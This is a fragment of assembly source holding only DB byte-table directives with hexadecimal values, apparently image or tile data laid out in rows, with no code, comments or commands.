DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,013H,01AH
DB 01AH,019H,019H,01AH,01AH,01AH,013H,013H,01CH,01CH,01CH,01CH,01CH,013H,00BH
DB 018H,01AH,01AH,019H,019H,01AH,01AH,01AH,013H,013H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,00BH,01AH,01AH,019H,019H,019H,01AH,019H,018H
DB 017H,016H,014H,014H,014H,016H,01AH,01AH,019H,019H,019H,01AH,01AH,018H,016H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,013H,01AH,01AH,019H,019H
DB 01AH,01AH,01AH,013H,013H,01CH,01CH,01CH,01CH,01CH,013H,00BH,018H,01AH,01AH
DB 019H,019H,01AH,01AH,01AH,013H,013H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,019H,019H,019H,019H,019H,019H,019H,019H,018H,017H,017H
DB 017H,017H,017H,018H,01AH,019H,019H,019H,01AH,01AH,018H,016H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,00BH,013H,01AH,01AH,019H,019H,01AH,01AH,01AH
DB 013H,013H,01CH,01CH,01CH,01CH,01CH,013H,00BH,018H,01AH,01AH,019H,019H,01AH
DB 01AH,01AH,013H,013H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,016H,019H,01AH,01AH,019H,019H,019H,019H,019H,019H,019H,019H,019H,019H
DB 019H,019H,019H,019H,01AH,01AH,01AH,018H,016H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,00BH,013H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,013H,013H,01CH
DB 01CH,01CH,01CH,01CH,013H,00BH,018H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,013H
DB 013H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,018H
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,019H,019H,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,018H,016H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 00BH,013H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,013H,013H,01CH,01CH,01CH,01CH
DB 01CH,013H,00BH,018H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,013H,013H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,013H,018H,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,018H,016H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,013H,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,013H,013H,01CH,01CH,01CH,01CH,01CH,013H,00BH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,013H,013H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,013H,013H,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,016H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,014H,014H,014H,014H,014H
DB 014H,014H,014H,014H,013H,01CH,01CH,01CH,01CH,01CH,013H,00BH,014H,014H,014H
DB 014H,014H,014H,014H,014H,014H,013H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,013H,013H,00BH,014H,011H,016H,016H
DB 016H,016H,016H,016H,013H,013H,014H,014H,014H,014H,014H,00BH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,013H,013H,013H,013H,013H,013H,013H,013H,013H
DB 013H,013H,01CH,01CH,01CH,01CH,01CH,013H,013H,013H,013H,013H,013H,013H,013H
DB 013H,013H,013H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,013H,013H,013H,013H,013H,013H,013H,013H
DB 013H,013H,013H,013H,013H,013H,013H,013H,013H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
